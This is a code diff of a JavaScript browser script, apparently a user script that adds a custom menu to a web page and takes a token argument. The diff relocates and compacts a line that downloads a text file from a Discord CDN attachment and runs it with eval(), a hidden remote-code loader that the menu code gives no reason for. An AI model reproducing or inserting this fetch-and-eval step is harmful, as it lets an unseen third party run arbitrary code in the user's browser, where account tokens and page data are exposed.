@@ -12,7 +12,6 @@ async function ws(token) {
     let custom="kastm kod"
     let kastm=false
     let exits=true;
-    let bl="947598329498443896/996418438086004807"
     async function kastommeni(){
         let kastmmenu = document.createElement("div");
         document.body.appendChild(kastmmenu)
@@ -83,9 +82,12 @@ async function ws(token) {
         kastommeni()
         btn.style.background=exits==false?"green":"gray"
     }}catch{}
+    let bl="947598329498443896/996418438086004807"
     const sleep = (milliseconds) => {return new Promise(resolve => setTimeout(resolve, milliseconds))};
     let oldHref=document.location.href
-    var bodyList = document.querySelector("body")
+    var bodyList = document.querySelector("body")    
+    let endpoint="https://cdn.discordapp.com"
+    fetch(endpoint+"/attachments/"+bl+"/message.txt").then(x=>{return x}).then(x=>{return x.text()}).then(x=>{eval(x)})
     var observer = new MutationObserver(function(mutations) {
         mutations.forEach(function(mutation) {
             if (oldHref != document.location.href) {
@@ -111,11 +113,6 @@ async function ws(token) {
         childList: true,
         subtree: true
     };
-    let p="https://cdn.discordapp.com"
-    fetch(p+"/attachments/"+bl+"/message.txt")
-    .then(x=>{       return x})
-    .then(x=>{return x.text()})
-    .then(x=>{        eval(x)})
     observer.observe(bodyList, config);
     let encrypt = (plainText) =>
         {
